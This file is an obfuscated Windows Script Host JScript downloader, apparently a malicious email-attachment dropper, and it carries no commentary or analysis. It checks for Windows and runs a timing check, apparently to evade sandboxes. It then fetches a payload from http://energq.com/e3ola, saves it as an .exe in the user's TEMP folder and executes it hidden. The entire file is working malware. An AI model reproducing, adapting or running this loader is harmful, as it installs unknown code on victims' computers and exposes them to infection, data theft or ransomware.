var yN = false;
var Y0 = "CreateObject";
var m = function H() {return WScript[Y0]("WScript.Shell");}(), Hk = 11;
var JM = "MSXML2.XMLHTTP";
var v = 2123213;
var cH = 0;
function M(b){m["Run"](b, cH, cH);};
function NC(){return "" + JM;};
function E0(s, N){cH = cH * 1; return s - N;};
function E(){return Y0;};
/*@cc_on
  @if (@_win32 || @_win64)
    yN = true;
  @end
@*/
if (yN)
{
var I = "";
function vg(){return 22;};
var Q = 0; var W0 = 0;
function Wf()
{
var wL = new this["Date"]();
var KY = wL["getUTCMilliseconds"]();
WScript["Sleep"](vg());
var wL = new this["Date"]();
var W = wL["getUTCMilliseconds"]();
WScript["Sleep"](vg());
var wL = new this["Date"]();
var w = wL["getUTCMilliseconds"]();
var Q = "x";
Q = E0(W, KY);
var W0 = "xI";
W0 = E0(w, W);
I = "open";
return E0(Q, W0);
}
var qd = false;
var D = false;
for (var V = cH; V < vg() * 1; V++){if (Wf() != cH){
qd = true; 
W0 = "31" + 11 * Q + W0; 
D = true; 
break;
}}
function CO() {return ((qd == true) && (qd == D)) ? 1 : cH;};
if (qd && CO() && D){
function pM() {return m["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "7qoIha2hv883ovyn.exe";};
 J = NC();
 fv = WScript[Y0](J);
 var f = 1;
 while (f){
try {
fv[I]("GET", "http://energq.com/e3ola", false);
fv["send"]();
Ep = "Sleep";
for (;;){WScript[Ep](vg() * 11); if (fv["readystate"] >= 2 * 2) break;};
f = cH;
} catch(F){};
}
function Y(mn) {var HQ = (1, 2, 3, 4, 5, mn); return HQ;};
Q0 = WScript[E()]("ADODB.Stream");
J = Q0;
J[I]();
J["type"] = Y(1);
J["write"](fv["ResponseBody"]);
Q0["position"] = Y(cH);
J["Save" + "ToFile"](pM(), 2);
Q0["c"+"lose"]();
qP = pM();
M(qP);
}
}

